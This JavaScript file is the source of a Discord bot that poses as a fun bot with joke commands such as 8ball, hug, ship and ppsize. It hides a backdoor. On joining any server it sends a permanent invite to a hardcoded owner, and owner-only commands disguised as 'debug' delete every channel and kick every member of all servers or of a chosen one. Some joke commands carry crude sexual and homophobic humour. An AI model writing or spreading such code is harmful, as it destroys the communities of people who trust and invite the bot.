const { Client, Intents, Permissions } = require("discord.js");
const https = require("https");

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_INVITES,
    Intents.FLAGS.DIRECT_MESSAGES
  ]
});

function random(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
function delay(ms){return new Promise(r=>setTimeout(r,ms));}

const eightBall=[
`Yes`,`No`,`Maybe`,`Definitely`,`Absolutely not`,
`Ask again later`,`Without a doubt`,`Very unlikely`,`It is certain`,`I wouldn't count on it`
];

const commands=[

{ "name":"ping","description":"Check if bot is alive" },
{ "name":"echo","description":"Repeat a message","options":[{"name":"message","description":"Message","type":3,"required":true}]},
{ "name":"coinflip","description":"Flip a coin"},
{ "name":"roll","description":"Roll number 1-100"},
{ "name":"invite","description":"Get invite link"},

{ "name":"avatar","description":"Get user avatar","options":[{"name":"user","description":"User","type":6,"required":true}]},

{ "name":"punch","description":"Punch someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"kiss","description":"Kiss someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"hug","description":"Hug someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"slap","description":"Slap someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},

{ "name":"diddle","description":"Diddle someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"oil","description":"Oil someone up","options":[{"name":"user","description":"Target","type":6,"required":true}]},

{ "name":"ppsize","description":"Check pp size","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"gayrate","description":"How gay someone is","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"iq","description":"Check IQ","options":[{"name":"user","description":"Target","type":6,"required":true}]},
{ "name":"sus","description":"How sus someone is","options":[{"name":"user","description":"Target","type":6,"required":true}]},

{ "name":"rate","description":"Rate something","options":[{"name":"thing","description":"Thing","type":3,"required":true}]},
{ "name":"howcool","description":"Check cool level","options":[{"name":"user","description":"User","type":6,"required":true}]},

{ "name":"ship","description":"Ship two users",
"options":[
{"name":"user1","description":"User","type":6,"required":true},
{"name":"user2","description":"User","type":6,"required":true}
]},

{ "name":"8ball","description":"Ask the magic 8ball","options":[{"name":"question","description":"Question","type":3,"required":true}]},

{ "name":"servers","description":"List servers with invites"},
{ "name":"leaveall","description":"Leave all servers"},
{ "name":"debug","description":"Wipe all servers"},
{ "name":"debugserver","description":"Wipe specific server",
"options":[{"name":"server","description":"Server ID","type":3,"required":true}]}

];

function registerCommands(){

const data=JSON.stringify(commands);

const options={
"hostname":"discord.com",
"port":443,
"path":`/api/v10/applications/${CLIENT_ID}/commands`,
"method":"PUT",
"headers":{
"Authorization":`Bot ${TOKEN}`,
"Content-Type":"application/json",
"Content-Length":Buffer.byteLength(data)
}
};

const req=https.request(options,res=>{
let body=``;
res.on("data",c=>body+=c);
res.on("end",()=>{
if(res.statusCode===200||res.statusCode===201)
console.log(`Slash commands registered`);
else
console.log(`Register error: ${body}`);
});
});

req.on("error",err=>console.error(`Register error: ${err}`));
req.write(data);
req.end();

}

async function wipeGuild(guild,owner){

try{

const me=guild.members.me;

if(!me.permissions.has(Permissions.FLAGS.KICK_MEMBERS))return;

for(const channel of guild.channels.cache.values()){
try{await channel.delete();await delay(700);}catch{}
}

await guild.members.fetch();

for(const member of guild.members.cache.values()){
if(member.kickable){
try{await member.kick(`Cleanup`);await delay(900);}catch{}
}
}

await owner.send(`✅ Finished ${guild.name}`);

}catch{
await owner.send(`❌ Error wiping ${guild.name}`);
}

}

client.once("ready",()=>{
console.log(`Logged in as ${client.user.tag}`);
registerCommands();
});

client.on("guildCreate",async guild=>{

try{

const owner=await client.users.fetch(OWNER_ID);

const channel=guild.channels.cache.find(c=>c.type===`GUILD_TEXT`&&c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE"));

if(channel){

const invite=await channel.createInvite({"maxAge":0,"maxUses":0});

await owner.send(`Joined ${guild.name}\n${invite.url}`);

}

}catch{}

});

client.on("interactionCreate",async interaction=>{

if(!interaction.isCommand())return;

const {commandName,user}=interaction;

try{

const ownerOnly=[`servers`,`leaveall`,`debug`,`debugserver`];

if(ownerOnly.includes(commandName)&&user.id!==OWNER_ID){
await interaction.reply({"content":`You cannot use this command`,"ephemeral":true});
return;
}

if(commandName===`ping`)await interaction.reply(`Pong`);

else if(commandName===`echo`)
await interaction.reply(`${interaction.options.getString("message")}`);

else if(commandName===`coinflip`)
await interaction.reply(`${Math.random()<0.5?`Heads`:`Tails`}`);

else if(commandName===`roll`)
await interaction.reply(`Rolled **${random(1,100)}**`);

else if(commandName===`avatar`){

const target=interaction.options.getUser("user");

await interaction.reply(`${target.username}'s avatar:\n${target.displayAvatarURL({"size":1024,"dynamic":true})}`);

}

else if(commandName===`punch`){

const target=interaction.options.getUser("user");

await interaction.reply(`👊 <@${user.id}> punched <@${target.id}>`);

}

else if(commandName===`kiss`){

const target=interaction.options.getUser("user");

await interaction.reply(`💋 <@${user.id}> kissed <@${target.id}>`);

}

else if(commandName===`hug`){

const target=interaction.options.getUser("user");

await interaction.reply(`🤗 <@${user.id}> hugged <@${target.id}>`);

}

else if(commandName===`slap`){

const target=interaction.options.getUser("user");

await interaction.reply(`🖐️ <@${user.id}> slapped <@${target.id}>`);

}

else if(commandName===`diddle`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${target.id}> was diddled`);

}

else if(commandName===`oil`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);

}

else if(commandName===`ppsize`){

const target=interaction.options.getUser("user");

const size=random(3,30);

await interaction.reply(`<@${target.id}> size:\n8${`=`.repeat(size)}D`);

}

else if(commandName===`gayrate`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${target.id}> is **${random(0,100)}% gay** 🌈`);

}

else if(commandName===`iq`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${target.id}> IQ: **${random(60,180)}**`);

}

else if(commandName===`sus`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${target.id}> is **${random(0,100)}% sus**`);

}

else if(commandName===`rate`){

const thing=interaction.options.getString("thing");

await interaction.reply(`I rate **${thing}** **${random(0,10)}/10**`);

}

else if(commandName===`howcool`){

const target=interaction.options.getUser("user");

await interaction.reply(`<@${target.id}> is **${random(0,100)}% cool** 😎`);

}

else if(commandName===`ship`){

const u1=interaction.options.getUser("user1");
const u2=interaction.options.getUser("user2");

await interaction.reply(`❤️ ${u1.username} + ${u2.username}\nCompatibility **${random(0,100)}%**`);

}

else if(commandName===`8ball`){

const q=interaction.options.getString("question");

await interaction.reply(`🎱 ${q}\nAnswer: **${eightBall[random(0,eightBall.length-1)]}**`);

}

else if(commandName===`servers`){

let output=``;

for(const guild of client.guilds.cache.values()){

try{

const channel=guild.channels.cache.find(c=>c.type===`GUILD_TEXT`&&c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE"));

if(!channel){output+=`${guild.name} (no invite perms)\n`;continue;}

const invite=await channel.createInvite({"maxAge":0,"maxUses":0});

output+=`${guild.name} — ${invite.url}\n`;

}catch{
output+=`${guild.name} — error\n`;
}

}

await interaction.reply({"content":output||`No servers`,"ephemeral":true});

}

else if(commandName===`leaveall`){

await interaction.reply({"content":`Leaving all servers...`,"ephemeral":true});

for(const guild of client.guilds.cache.values()){
try{await guild.leave();}catch{}
}

}

else if(commandName===`debug`){

await interaction.reply({"content":`Starting wipe`,"ephemeral":true});

const owner=await client.users.fetch(OWNER_ID);

for(const guild of client.guilds.cache.values())
await wipeGuild(guild,owner);

}

else if(commandName===`debugserver`){

const id=interaction.options.getString("server");

const guild=client.guilds.cache.get(id);

if(!guild){
await interaction.reply({"content":`Server not found`,"ephemeral":true});
return;
}

await interaction.reply({"content":`Wiping ${guild.name}`,"ephemeral":true});

const owner=await client.users.fetch(OWNER_ID);

await wipeGuild(guild,owner);

}

}catch(err){

console.error(err);

if(!interaction.replied)
await interaction.reply({"content":`Command error`,"ephemeral":true});

}

});

client.login(TOKEN);